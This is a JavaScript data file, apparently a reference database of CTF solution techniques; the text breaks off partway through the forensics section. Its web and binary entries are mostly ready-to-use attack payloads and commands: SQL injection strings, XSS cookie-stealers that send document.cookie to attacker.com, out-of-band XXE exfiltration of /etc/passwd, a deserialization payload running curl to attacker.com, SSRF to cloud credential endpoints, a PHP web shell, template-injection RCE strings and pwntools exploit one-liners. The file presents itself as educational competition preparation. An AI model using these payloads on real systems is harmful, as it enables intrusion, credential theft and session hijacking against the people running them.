// CTF Challenge Solutions Reference Database — educational patterns and approaches
// For authorized security education and CTF competition preparation only.

export const CTF_WRITEUPS_DB = {
  web: [
    {
      name: "SQL Injection — UNION-based extraction",
      category: "Web",
      difficulty: "Easy",
      description: "Login form vulnerable to SQL injection. Extract database contents via UNION SELECT.",
      approach: "Identify injection point, determine column count with ORDER BY, use UNION SELECT to extract data from information_schema.",
      solution: [
        "Test for injection: ' OR 1=1-- in username field",
        "Determine column count: ' ORDER BY 1-- (increment until error at N+1, columns = N)",
        "Find displayable columns: ' UNION SELECT 1,2,3,...,N--",
        "Extract database name: ' UNION SELECT 1,database(),3--",
        "List tables: ' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "List columns: ' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
        "Extract data: ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--"
      ],
      commands: ["sqlmap -u 'http://target/login?user=admin' --dbs", "sqlmap -u 'http://target/login?user=admin' -D mydb --tables", "sqlmap -u 'http://target/login?user=admin' -D mydb -T users --dump"],
      tools: ["sqlmap", "Burp Suite", "browser dev tools"],
      concepts: ["SQL injection", "UNION SELECT", "information_schema", "GROUP_CONCAT"]
    },
    {
      name: "SQL Injection — Blind Boolean-based",
      category: "Web",
      difficulty: "Medium",
      description: "No visible output from injection, but application behavior changes based on query truth value.",
      approach: "Use conditional statements to extract data one character at a time by observing different responses for true/false.",
      solution: [
        "Identify blind injection: ' AND 1=1-- (normal) vs ' AND 1=2-- (different response)",
        "Extract database name length: ' AND LENGTH(database())=N--",
        "Extract database name char by char: ' AND SUBSTRING(database(),1,1)='a'--",
        "Binary search for speed: ' AND ASCII(SUBSTRING(database(),1,1))>77--",
        "Script the extraction with Python requests library",
        "Alternative: use CASE WHEN for more complex conditions"
      ],
      commands: ["sqlmap -u 'http://target/?id=1' --technique=B --dump", "python3 blind_sqli.py  # custom script iterating chars"],
      tools: ["sqlmap", "Python requests", "Burp Intruder"],
      concepts: ["Blind SQL injection", "Boolean-based", "SUBSTRING", "ASCII", "binary search"]
    },
    {
      name: "SQL Injection — Time-based Blind",
      category: "Web",
      difficulty: "Medium",
      description: "No visible output difference, but can inject time delays to infer data.",
      approach: "Use conditional SLEEP/WAITFOR to cause delays when condition is true. Measure response time.",
      solution: [
        "Confirm injection: ' AND SLEEP(5)-- (response delayed by 5 seconds)",
        "Extract data: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)--",
        "Use BENCHMARK as alternative: ' AND IF(1=1, BENCHMARK(5000000, SHA1('test')), 0)--",
        "MSSQL: '; WAITFOR DELAY '0:0:5'--",
        "PostgreSQL: '; SELECT pg_sleep(5)--",
        "Automate with sqlmap --technique=T"
      ],
      commands: ["sqlmap -u 'http://target/?id=1' --technique=T --time-sec=3"],
      tools: ["sqlmap", "Python", "Burp Suite"],
      concepts: ["Time-based blind SQLi", "SLEEP", "WAITFOR DELAY", "pg_sleep", "BENCHMARK"]
    },
    {
      name: "XSS — Reflected (filter bypass)",
      category: "Web",
      difficulty: "Easy-Medium",
      description: "User input reflected in page response. Basic <script> is filtered but can be bypassed.",
      approach: "Identify reflection point, test what's filtered, use alternative event handlers and tag combinations.",
      solution: [
        "Test basic: <script>alert(1)</script> — likely filtered",
        "Try event handlers: <img src=x onerror=alert(1)>",
        "Try SVG: <svg onload=alert(1)>",
        "Case variation: <ScRiPt>alert(1)</sCrIpT>",
        "Encoding: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "Tag breaking: \"><img src=x onerror=alert(1)>",
        "Inside attribute: \" onfocus=alert(1) autofocus=\"",
        "Template literal (JS context): ${alert(1)}"
      ],
      commands: ["dalfox url 'http://target/?q=test'", "python3 xsstrike.py -u 'http://target/?q=test'"],
      tools: ["dalfox", "XSStrike", "Burp Suite"],
      concepts: ["Reflected XSS", "WAF bypass", "event handlers", "encoding bypass", "context-aware injection"]
    },
    {
      name: "XSS — Stored (comment field)",
      category: "Web",
      difficulty: "Easy",
      description: "Comment form stores user input and displays it to other users without sanitization.",
      approach: "Inject JavaScript payload in comment field. It executes when any user views the page.",
      solution: [
        "Submit comment with: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "If script tags filtered, use: <img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">",
        "Set up webhook to receive stolen cookies: nc -lvp 80 or use webhook.site",
        "Use stolen session cookie to access admin account",
        "For CSP bypass: check if nonce/hash is predictable, or use allowed domains"
      ],
      commands: ["nc -lvp 80  # listen for stolen cookies", "python3 -m http.server 80  # serve payload"],
      tools: ["Burp Suite", "webhook.site", "netcat"],
      concepts: ["Stored XSS", "cookie theft", "session hijacking", "CSP"]
    },
    {
      name: "XSS — DOM-based",
      category: "Web",
      difficulty: "Medium",
      description: "Client-side JavaScript reads from location.hash/search and writes to DOM without sanitization.",
      approach: "Identify sink (innerHTML, document.write, eval) and source (location.hash, URL params). Craft URL with payload.",
      solution: [
        "Identify source: code reads from location.hash, location.search, document.referrer",
        "Identify sink: innerHTML, document.write(), eval(), setTimeout(str), jQuery html()",
        "Craft URL: http://target/#<img src=x onerror=alert(1)>",
        "If URL-encoded: use # fragment (not sent to server, avoids server-side WAF)",
        "Test: http://target/page?default=<script>alert(1)</script>"
      ],
      commands: [],
      tools: ["Browser DevTools", "DOM Invader (Burp)"],
      concepts: ["DOM XSS", "sources and sinks", "fragment injection", "client-side only"]
    },
    {
      name: "Server-Side Request Forgery (SSRF)",
      category: "Web",
      difficulty: "Medium",
      description: "Application fetches URLs provided by user. Can be abused to access internal services or cloud metadata.",
      approach: "Supply internal URLs or cloud metadata endpoints to the URL-fetching feature.",
      solution: [
        "Basic SSRF: supply http://127.0.0.1:8080/admin as URL",
        "AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "GCP metadata: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (with header Metadata-Flavor: Google)",
        "Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (with header Metadata: true)",
        "DNS rebinding: register domain that resolves to 127.0.0.1",
        "Filter bypass: use http://0x7f000001 or http://2130706433 or http://0177.0.0.1 or http://[::1]",
        "File protocol: file:///etc/passwd (if allowed)"
      ],
      commands: ["curl http://target/fetch?url=http://169.254.169.254/latest/meta-data/"],
      tools: ["Burp Suite", "SSRFmap", "Gopherus"],
      concepts: ["SSRF", "cloud metadata", "IMDSv1/v2", "DNS rebinding", "protocol smuggling"]
    },
    {
      name: "XML External Entity (XXE)",
      category: "Web",
      difficulty: "Medium",
      description: "Application parses XML input. External entity declarations can read local files or make requests.",
      approach: "Inject DTD with external entity referencing local files or internal URLs.",
      solution: [
        "Basic file read: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "If no output (blind): use out-of-band exfiltration via HTTP",
        "OOB XXE: <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;",
        "evil.dtd: <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>\"> %eval;",
        "PHP expect: <!ENTITY xxe SYSTEM \"expect://id\"> (if expect wrapper available)",
        "SSRF via XXE: <!ENTITY xxe SYSTEM \"http://internal-service/\">",
        "Content-Type: change application/json to application/xml and send XML body"
      ],
      commands: [],
      tools: ["Burp Suite", "XXEinjector"],
      concepts: ["XXE", "DTD", "external entities", "OOB exfiltration", "parameter entities"]
    },
    {
      name: "Deserialization — Java (ysoserial)",
      category: "Web",
      difficulty: "Hard",
      description: "Java application deserializes untrusted data. Gadget chains in classpath enable remote code execution.",
      approach: "Identify serialized Java objects (base64 of rO0AB or AC ED 00 05 hex). Generate payload with ysoserial.",
      solution: [
        "Identify: look for base64-encoded cookies/parameters starting with rO0AB",
        "Or hex bytes: AC ED 00 05 (Java serialization magic)",
        "Generate payload: java -jar ysoserial.jar CommonsCollections1 'command' | base64",
        "Common gadget chains: CommonsCollections1-7, Spring1, Groovy1, JRMPClient",
        "Send payload in the cookie/parameter that contained the serialized object",
        "If CommonsCollections not in classpath, try other chains: Spring, Hibernate, etc.",
        "Enumerate classpath: use GadgetProbe or URLDNS chain (causes DNS lookup)"
      ],
      commands: ["java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/$(whoami)' | base64 -w 0"],
      tools: ["ysoserial", "GadgetProbe", "Burp Java Deserialization Scanner"],
      concepts: ["Java deserialization", "gadget chains", "ObjectInputStream", "classpath"]
    },
    {
      name: "JWT — Algorithm None Attack",
      category: "Web",
      difficulty: "Easy",
      description: "Server accepts JWT with alg:none, allowing token forgery without a key.",
      approach: "Decode JWT, change alg to 'none', modify payload claims, remove signature.",
      solution: [
        "Decode JWT: header.payload.signature (base64url encoded)",
        "Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Modify payload: change 'sub' to admin, 'role' to admin, etc.",
        "Base64url encode both parts",
        "Construct token: base64url(header).base64url(payload). (empty signature, keep trailing dot)",
        "Variations: try 'None', 'NONE', 'nOnE' — some libraries are case-insensitive"
      ],
      commands: ["python3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, key='', algorithm='none'))\""],
      tools: ["jwt_tool", "jwt.io", "Python PyJWT"],
      concepts: ["JWT", "algorithm confusion", "alg:none", "token forgery"]
    },
    {
      name: "JWT — Key Confusion (RS256 → HS256)",
      category: "Web",
      difficulty: "Medium-Hard",
      description: "Server uses RS256 (asymmetric) but also accepts HS256 (symmetric). Public key used as HMAC secret.",
      approach: "Change alg from RS256 to HS256, sign token with the server's public key as the HMAC secret.",
      solution: [
        "Obtain the server's public key (often at /jwks.json, /.well-known/jwks.json, or in JWT header jku/x5u)",
        "Change JWT header alg from RS256 to HS256",
        "Modify payload claims as desired",
        "Sign the token using the public key as the HMAC-SHA256 secret",
        "The server uses the same public key to verify — HMAC(message, publicKey) matches"
      ],
      commands: ["python3 jwt_tool.py <token> -X k -pk public.pem"],
      tools: ["jwt_tool", "Python PyJWT"],
      concepts: ["JWT key confusion", "algorithm switching", "RS256 vs HS256", "asymmetric to symmetric"]
    },
    {
      name: "Server-Side Template Injection (SSTI)",
      category: "Web",
      difficulty: "Medium",
      description: "User input rendered inside a server-side template engine (Jinja2, Twig, Freemarker, etc.).",
      approach: "Identify template engine with polyglot payloads, then use engine-specific syntax for RCE.",
      solution: [
        "Detect: submit {{7*7}} — if response contains 49, likely Jinja2/Twig",
        "Detect: submit ${7*7} — if 49, could be Freemarker/Velocity/Mako",
        "Detect: submit #{7*7} — if 49, could be Ruby ERB or Java EL",
        "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "Jinja2 alt: {{''.__class__.__mro__[1].__subclasses__()}} — find subprocess.Popen",
        "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "Freemarker: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
      ],
      commands: ["tplmap -u 'http://target/?name=test'"],
      tools: ["tplmap", "SSTImap", "Burp Suite"],
      concepts: ["SSTI", "template engines", "Jinja2", "Twig", "MRO chain", "sandbox escape"]
    },
    {
      name: "File Upload Bypass",
      category: "Web",
      difficulty: "Medium",
      description: "Application restricts file uploads but validation can be bypassed to upload a web shell.",
      approach: "Bypass extension filter, content-type check, or magic bytes validation.",
      solution: [
        "Extension bypass: .php5, .phtml, .phar, .php.jpg, .php%00.jpg (null byte — old PHP)",
        "Double extension: shell.php.jpg (if server uses first extension)",
        "Content-Type: change to image/jpeg in Burp while keeping .php extension",
        "Magic bytes: prepend GIF89a; to PHP file (passes magic byte check)",
        "Case variation: .PhP, .pHp",
        ".htaccess upload: AddType application/x-httpd-php .jpg (makes .jpg files execute as PHP)",
        "SVG with XSS: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>",
        "Web shell: <?php system($_GET['cmd']); ?>"
      ],
      commands: ["curl http://target/uploads/shell.php?cmd=whoami"],
      tools: ["Burp Suite", "curl"],
      concepts: ["File upload", "extension bypass", "content-type bypass", "magic bytes", "web shell"]
    },
    {
      name: "Insecure Direct Object Reference (IDOR)",
      category: "Web",
      difficulty: "Easy",
      description: "Application uses predictable identifiers (sequential IDs) to access objects without authorization checks.",
      approach: "Change the object ID in the request to access other users' data.",
      solution: [
        "Identify parameter: /api/user/profile?id=1234",
        "Change ID: /api/user/profile?id=1235, id=1, id=0",
        "Check POST bodies: {\"user_id\": 1234} → {\"user_id\": 1}",
        "Check UUID: try other users' UUIDs if discoverable",
        "Test horizontal (same role, different user) and vertical (different role) access",
        "Automate with Burp Intruder: iterate through ID range"
      ],
      commands: ["curl -H 'Cookie: session=abc' http://target/api/user/1", "for i in $(seq 1 100); do curl -s http://target/api/user/$i | grep flag; done"],
      tools: ["Burp Suite", "Autorize extension", "curl"],
      concepts: ["IDOR", "access control", "authorization bypass", "horizontal/vertical escalation"]
    },
    {
      name: "Prototype Pollution",
      category: "Web",
      difficulty: "Hard",
      description: "JavaScript application allows modification of Object.prototype via user input, affecting all objects.",
      approach: "Inject __proto__ or constructor.prototype to add/modify properties on all objects.",
      solution: [
        "Identify merge/clone/extend functions that recursively copy properties",
        "Payload in JSON body: {\"__proto__\":{\"isAdmin\":true}}",
        "URL param: ?__proto__[isAdmin]=true",
        "Constructor form: {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
        "Check if obj.isAdmin is now true for all objects",
        "RCE via: pollute 'shell' or 'NODE_OPTIONS' or template engine options",
        "Client-side: pollute innerHTML, srcdoc, or event handler properties for XSS"
      ],
      commands: [],
      tools: ["Burp Suite", "pp-finder"],
      concepts: ["Prototype pollution", "__proto__", "Object.prototype", "deep merge vulnerability"]
    },
    {
      name: "Race Condition (TOCTOU)",
      category: "Web",
      difficulty: "Medium-Hard",
      description: "Time-of-check to time-of-use vulnerability. Send many concurrent requests to exploit a race window.",
      approach: "Send multiple identical requests simultaneously to exploit the gap between check and action.",
      solution: [
        "Identify: discount/coupon codes, balance transfers, vote systems, file operations",
        "Use Burp Turbo Intruder or Repeater (send group in parallel)",
        "Python threading: send 50+ identical requests simultaneously",
        "Example: apply discount code multiple times before balance is updated",
        "Burp: 'Send group in parallel (last-byte sync)' for precise timing",
        "HTTP/2 single-packet attack: multiple requests in one TCP packet"
      ],
      commands: ["turbo-intruder  # Burp extension for race conditions"],
      tools: ["Burp Turbo Intruder", "Python threading/asyncio", "curl parallel"],
      concepts: ["Race condition", "TOCTOU", "concurrency", "atomicity", "HTTP/2 single-packet"]
    }
  ],

  crypto: [
    {
      name: "Caesar Cipher",
      category: "Crypto",
      difficulty: "Easy",
      description: "Each letter shifted by a fixed amount (0-25). 26 possible keys — brute force all.",
      approach: "Try all 26 shifts or use frequency analysis.",
      solution: [
        "Brute force: try all 26 rotations",
        "Frequency analysis: most common letter is likely 'e' (English)",
        "ROT13 is a special case (shift=13, self-inverse)",
        "Python: ''.join(chr((ord(c)-65+shift)%26+65) if c.isalpha() else c for c in text)"
      ],
      commands: ["echo 'ENCRYPTED' | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13"],
      tools: ["dcode.fr", "CyberChef", "Python"],
      concepts: ["Caesar cipher", "ROT13", "monoalphabetic substitution", "frequency analysis"]
    },
    {
      name: "Vigenere Cipher",
      category: "Crypto",
      difficulty: "Easy-Medium",
      description: "Polyalphabetic substitution. Each letter shifted by the corresponding key letter. Repeating key.",
      approach: "Find key length with Kasiski/Friedman, then solve each position as a Caesar cipher.",
      solution: [
        "Find key length: Kasiski examination (repeated sequences) or Index of Coincidence",
        "Once key length k is known, split ciphertext into k groups",
        "Each group is a Caesar cipher — frequency analysis on each",
        "Alternatively: try common key lengths 3-20 and check IoC of each group",
        "Online tools automate this entirely"
      ],
      commands: [],
      tools: ["dcode.fr", "CyberChef", "Python"],
      concepts: ["Vigenere cipher", "Kasiski examination", "Index of Coincidence", "polyalphabetic"]
    },
    {
      name: "XOR Encryption — Known Plaintext",
      category: "Crypto",
      difficulty: "Easy",
      description: "Data XOR'd with a key. If you know part of the plaintext, XOR it with ciphertext to recover the key.",
      approach: "XOR known plaintext with ciphertext to get key. Key often repeats.",
      solution: [
        "key = ciphertext XOR plaintext (for known bytes)",
        "Common known plaintext: file headers (PNG: 89504E47, PDF: 25504446, ELF: 7f454c46)",
        "HTTP responses often start with 'HTTP/1.1'",
        "If key repeats: use xortool to find key length and key automatically",
        "Single-byte XOR: brute force 256 possible keys, check which produces readable text"
      ],
      commands: ["xortool -l 16 -c 20 encrypted.bin  # key length 16, most common byte 0x20 (space)", "python3 -c \"import itertools; key=b'KEY'; print(bytes(a^b for a,b in zip(ciphertext, itertools.cycle(key))))\""],
      tools: ["xortool", "CyberChef", "Python"],
      concepts: ["XOR cipher", "known plaintext attack", "key recovery", "repeating key"]
    },
    {
      name: "RSA — Small Public Exponent (e=3)",
      category: "Crypto",
      difficulty: "Medium",
      description: "RSA with e=3 and small message. m^3 < n, so ciphertext = m^3 (no modular reduction).",
      approach: "Take the cube root of the ciphertext to recover plaintext directly.",
      solution: [
        "c = m^e mod n. If m^e < n (message is small), then c = m^e exactly",
        "Recover m = c^(1/e) — integer cube root",
        "Python: from gmpy2 import iroot; m, exact = iroot(c, 3)",
        "If not exact: try Hastad's broadcast attack (same message, different n values)",
        "Hastad: given c1=m^3 mod n1, c2=m^3 mod n2, c3=m^3 mod n3, use CRT then cube root"
      ],
      commands: ["python3 -c \"from gmpy2 import iroot; c=CIPHERTEXT; m,_=iroot(c,3); print(bytes.fromhex(hex(m)[2:]))\""],
      tools: ["Python gmpy2", "SageMath", "RsaCtfTool"],
      concepts: ["RSA", "small exponent", "cube root attack", "Hastad broadcast", "CRT"]
    },
    {
      name: "RSA — Wiener's Attack (large e)",
      category: "Crypto",
      difficulty: "Medium",
      description: "RSA with very large public exponent e (small private exponent d). Vulnerable to continued fraction attack.",
      approach: "Use continued fraction expansion of e/n to find d.",
      solution: [
        "If d < n^(1/4) / 3, Wiener's attack recovers d",
        "Compute continued fraction convergents of e/n",
        "For each convergent k/d: check if d is the private key",
        "Verify: compute phi = (ed - 1) / k, check if phi gives valid p,q",
        "Python: use owiener library or implement continued fractions"
      ],
      commands: ["python3 -c \"import owiener; d = owiener.attack(e, n); print(d)\""],
      tools: ["owiener", "RsaCtfTool", "SageMath"],
      concepts: ["RSA", "Wiener's attack", "continued fractions", "small private exponent"]
    },
    {
      name: "AES-ECB — Cut and Paste",
      category: "Crypto",
      difficulty: "Medium",
      description: "AES in ECB mode encrypts each 16-byte block independently. Blocks can be rearranged.",
      approach: "Craft input so that a block boundary aligns with data you want to swap. Rearrange encrypted blocks.",
      solution: [
        "ECB encrypts identical plaintext blocks to identical ciphertext blocks",
        "Craft email to align 'admin' at a block boundary: email=AAAAAAAAAA admin\\x0b\\x0b...@x.com",
        "This creates a block containing 'admin' + PKCS7 padding",
        "Take that encrypted block and replace the role block in the token",
        "Result: valid token with role=admin instead of role=user"
      ],
      commands: [],
      tools: ["Python", "CyberChef"],
      concepts: ["AES-ECB", "block cipher", "cut-and-paste", "block rearrangement", "PKCS7"]
    },
    {
      name: "AES-ECB — Byte-at-a-Time Oracle",
      category: "Crypto",
      difficulty: "Medium-Hard",
      description: "Oracle appends secret to your input and encrypts with AES-ECB. Recover secret one byte at a time.",
      approach: "Control input length to push one unknown byte into a block you can predict, then brute-force that byte.",
      solution: [
        "Confirm ECB: send 32 identical bytes, check for repeated blocks",
        "Find block size: increase input length until output grows (block size = growth increment)",
        "Recover byte 1: send 15 'A's. Block 1 = AES(AAAAAAAAAAAAAAA || secret[0])",
        "Brute force: for each byte value b, send AAAAAAAAAAAAAAA || b, check if block matches",
        "Recover byte 2: send 14 'A's. Block 1 = AES(AAAAAAAAAAAAAA || secret[0] || secret[1])",
        "Continue shifting the window to reveal all bytes of the secret"
      ],
      commands: [],
      tools: ["Python"],
      concepts: ["AES-ECB", "chosen plaintext", "byte-at-a-time", "oracle attack"]
    },
    {
      name: "Padding Oracle Attack",
      category: "Crypto",
      difficulty: "Hard",
      description: "Server reveals whether CBC padding is valid or invalid. Decrypt ciphertext without the key.",
      approach: "Manipulate ciphertext bytes and observe padding errors to recover intermediate state, then XOR with IV to get plaintext.",
      solution: [
        "CBC decryption: P[i] = D(C[i]) XOR C[i-1]",
        "Modify C[i-1] bytes and send to server. Server decrypts and checks padding.",
        "When padding is valid (e.g., \\x01 at last position), we know D(C[i])[15] XOR C'[i-1][15] = 0x01",
        "So D(C[i])[15] = C'[i-1][15] XOR 0x01 — we found one byte of intermediate state",
        "P[i][15] = D(C[i])[15] XOR C[i-1][15] — recover plaintext byte",
        "Repeat for \\x02\\x02, \\x03\\x03\\x03, etc. to recover all 16 bytes per block",
        "Process each block — full plaintext recovery without key"
      ],
      commands: ["padbuster http://target/decrypt CIPHERTEXT 16 -encoding 0"],
      tools: ["PadBuster", "Python", "Burp Suite"],
      concepts: ["Padding oracle", "CBC mode", "PKCS7 padding", "chosen ciphertext"]
    },
    {
      name: "Hash Length Extension",
      category: "Crypto",
      difficulty: "Medium",
      description: "MAC = H(secret || message). Without knowing the secret, extend the message and compute valid MAC.",
      approach: "MD5/SHA1/SHA256 internal state can be reconstructed from hash output. Append data and continue hashing.",
      solution: [
        "Given: hash = H(secret || message), len(secret) known or guessable",
        "Reconstruct H's internal state from the known hash value",
        "Append padding + new_data to message",
        "Continue hashing from reconstructed state with new_data",
        "Result: valid H(secret || message || padding || new_data) without knowing secret",
        "Tools: hash_extender, HashPump automate this"
      ],
      commands: ["hash_extender -d 'original_data' -s ORIGINAL_HASH -a 'appended_data' -l SECRET_LENGTH -f sha256"],
      tools: ["hash_extender", "HashPump"],
      concepts: ["Hash length extension", "Merkle-Damgard", "MD5", "SHA-1", "SHA-256", "MAC forgery"]
    }
  ],

  binary: [
    {
      name: "Buffer Overflow — ret2win",
      category: "Binary/Pwn",
      difficulty: "Easy",
      description: "Simple stack buffer overflow. Overwrite return address with address of a 'win' function that prints the flag.",
      approach: "Find offset to return address, overwrite with win function address.",
      solution: [
        "Find buffer size: pattern_create + pattern_offset, or send increasing 'A's until crash",
        "Identify win function: objdump -d binary | grep win (or flag, shell, etc.)",
        "Find offset: where EIP/RIP gets overwritten (use cyclic pattern)",
        "Build payload: padding + win_address",
        "Python: payload = b'A' * offset + p64(win_addr)  # pwntools",
        "Send: ./binary <<< $(python3 -c 'print(payload)')"
      ],
      commands: ["python3 -c \"from pwn import *; p=process('./vuln'); p.sendline(b'A'*40 + p64(0x401234)); p.interactive()\""],
      tools: ["pwntools", "gdb", "gef/pwndbg", "checksec"],
      concepts: ["Stack buffer overflow", "return address overwrite", "EIP/RIP control", "NX"]
    },
    {
      name: "Buffer Overflow — ret2libc",
      category: "Binary/Pwn",
      difficulty: "Medium",
      description: "NX enabled (non-executable stack). Chain libc function calls instead of injecting shellcode.",
      approach: "Overwrite return address with libc system(), passing '/bin/sh' as argument.",
      solution: [
        "Find libc base: leak a GOT entry at runtime, subtract known offset",
        "Or: ldd binary to find libc path, readelf -s libc.so.6 | grep system",
        "32-bit: payload = padding + system_addr + exit_addr + binsh_addr",
        "64-bit: need ROP gadget to put /bin/sh addr in RDI first",
        "64-bit: payload = padding + pop_rdi_ret + binsh_addr + system_addr",
        "Find /bin/sh string: strings -a -t x libc.so.6 | grep /bin/sh",
        "ASLR: leak libc address first (format string, partial overwrite, etc.)"
      ],
      commands: ["checksec binary  # verify NX is enabled", "ROPgadget --binary binary | grep 'pop rdi'", "one_gadget libc.so.6  # find magic gadgets"],
      tools: ["pwntools", "ROPgadget", "one_gadget", "libc-database"],
      concepts: ["ret2libc", "NX bypass", "GOT/PLT", "ASLR", "libc leak"]
    },
    {
      name: "Buffer Overflow — ROP Chain",
      category: "Binary/Pwn",
      difficulty: "Hard",
      description: "NX enabled, no single function to call. Chain multiple small code gadgets ending in RET.",
      approach: "Find gadgets (pop reg; ret), chain them to set up registers and call execve or mprotect+shellcode.",
      solution: [
        "Find gadgets: ROPgadget --binary binary",
        "Common gadgets needed: pop rdi; ret / pop rsi; ret / pop rdx; ret / syscall",
        "Strategy 1: execve('/bin/sh', NULL, NULL) via syscall",
        "  RAX=59(execve), RDI='/bin/sh' addr, RSI=0, RDX=0, then syscall",
        "Strategy 2: mprotect(stack_page, size, PROT_READ|PROT_WRITE|PROT_EXEC) then jump to shellcode",
        "Strategy 3: ret2csu — use __libc_csu_init gadgets for register control",
        "Build chain: payload = padding + gadget1 + arg1 + gadget2 + arg2 + ... + final_call"
      ],
      commands: ["ROPgadget --binary binary --ropchain  # auto-generate execve chain", "ropper --file binary --chain execve"],
      tools: ["ROPgadget", "ropper", "pwntools ROP class", "gdb"],
      concepts: ["Return-Oriented Programming", "gadgets", "execve", "syscall", "ret2csu", "stack pivot"]
    },
    {
      name: "Format String — Read/Write",
      category: "Binary/Pwn",
      difficulty: "Medium",
      description: "printf(user_input) without format string. Read stack values and write to arbitrary addresses.",
      approach: "Use %x/%p to leak stack, %n to write values to memory.",
      solution: [
        "Read stack: send %p.%p.%p.%p to leak stack/libc/canary values",
        "Direct parameter access: %7$p reads the 7th printf argument",
        "Find your input on stack: send AAAA%p%p%p... look for 0x41414141",
        "Arbitrary read: place address on stack, use %s to read string at that address",
        "Arbitrary write with %n: writes number of chars printed so far to address pointed to by argument",
        "Precise write: use %hhn (write 1 byte), %hn (2 bytes), or %n (4 bytes)",
        "pwntools: fmtstr_payload(offset, {target_addr: value})"
      ],
      commands: ["python3 -c \"from pwn import *; print(fmtstr_payload(7, {0x404040: 0xdeadbeef}))\""],
      tools: ["pwntools fmtstr_payload", "gdb"],
      concepts: ["Format string vulnerability", "printf", "%n write", "%p leak", "GOT overwrite"]
    },
    {
      name: "Heap — Use-After-Free",
      category: "Binary/Pwn",
      difficulty: "Hard",
      description: "Object freed but pointer still used. Allocate new object in same memory to control freed object's data.",
      approach: "Free an object, allocate something else of same size to occupy the memory, then use the stale pointer.",
      solution: [
        "Free object A (e.g., a user struct with a function pointer)",
        "Allocate object B of the same size (heap allocator reuses the freed chunk)",
        "Object B's data now overlaps where A's function pointer was",
        "Control B's data to overwrite A's function pointer with target address",
        "Trigger the stale pointer (e.g., call A->callback) — jumps to your address",
        "tcache: in glibc 2.26+, freed chunks go to per-thread tcache (faster reuse)"
      ],
      commands: [],
      tools: ["gdb", "pwndbg/gef", "pwntools"],
      concepts: ["Use-after-free", "heap allocation", "tcache", "dangling pointer", "type confusion"]
    },
    {
      name: "Heap — Double Free (tcache)",
      category: "Binary/Pwn",
      difficulty: "Hard",
      description: "Free the same chunk twice. Creates a cycle in the free list. Next allocation returns an arbitrary address.",
      approach: "Double free to create cycle in tcache, then allocate to get write-what-where.",
      solution: [
        "Free chunk A twice (tcache doesn't check double-free in older glibc)",
        "Tcache free list: A → A (cycle)",
        "Allocate: returns A. Write target address into A's fd pointer",
        "Free list now: A → target_addr",
        "Allocate: returns A again. Allocate again: returns target_addr",
        "Now you can write arbitrary data to target_addr",
        "glibc 2.29+ added tcache key check — bypass by overwriting the key"
      ],
      commands: [],
      tools: ["gdb", "pwndbg/gef", "pwntools", "how2heap"],
      concepts: ["Double free", "tcache poisoning", "fd pointer", "arbitrary write", "glibc heap"]
    },
    {
      name: "GOT Overwrite",
      category: "Binary/Pwn",
      difficulty: "Medium",
      description: "Overwrite a GOT entry (lazy-resolved function pointer) with target address. Next call to that function calls your target.",
      approach: "Use format string or heap exploit to write to GOT. Overwrite puts@GOT with system address.",
      solution: [
        "GOT holds resolved addresses of libc functions after first call",
        "If you can write to GOT: overwrite puts@GOT with system@libc",
        "Next time the program calls puts(user_input), it actually calls system(user_input)",
        "Common target: overwrite printf/puts/exit with system or one_gadget",
        "Check: objdump -R binary | grep puts (shows GOT address)",
        "If Partial RELRO: GOT is writable. Full RELRO: GOT is read-only after startup."
      ],
      commands: ["objdump -R binary | grep puts", "readelf -r binary | grep JUMP_SLOT"],
      tools: ["pwntools", "gdb", "objdump"],
      concepts: ["GOT overwrite", "PLT/GOT", "lazy binding", "RELRO", "libc function hijacking"]
    },
    {
      name: "Stack Canary Bypass",
      category: "Binary/Pwn",
      difficulty: "Medium",
      description: "Stack canary protects return address. Need to leak or bypass the canary value.",
      approach: "Leak canary via format string or brute force (fork server), then include correct canary in overflow.",
      solution: [
        "Canary is a random value placed between buffer and saved EBP/return address",
        "If wrong canary: __stack_chk_fail terminates the process",
        "Leak via format string: %11$p (or whatever offset the canary is at)",
        "Leak via over-read: if there's a read vulnerability that can read past the buffer",
        "Brute force (fork server only): guess one byte at a time (256 attempts per byte, 4 bytes on 32-bit)",
        "Linux canary: starts with null byte (\\x00) to prevent string functions from leaking it",
        "Include leaked canary at correct offset in overflow payload"
      ],
      commands: [],
      tools: ["pwntools", "gdb"],
      concepts: ["Stack canary", "__stack_chk_fail", "canary leak", "brute force", "fork server"]
    }
  ],

  forensics: [
    {
      name: "Disk Image Analysis",
      category: "Forensics",
      difficulty: "Easy-Medium",
      description: "Given a disk image (.img, .dd, .E01), find hidden files, deleted data, or embedded flags.",
      approach: "Mount the image, examine filesystem, recover deleted files, check slack space.",
      solution: [
        "Mount: mount -o loop,ro image.img /mnt/evidence",
        "List files: ls -laR /mnt/evidence",
        "Recover deleted files: photorec image.img or foremost -i image.img",
        "Check strings: strings image.img | grep -i flag",
        "Examine with Autopsy: autopsy (web-based forensic browser)",
        "Check filesystem journal: debugfs image.img",
        "NTFS: use ntfsundelete to recover deleted files",
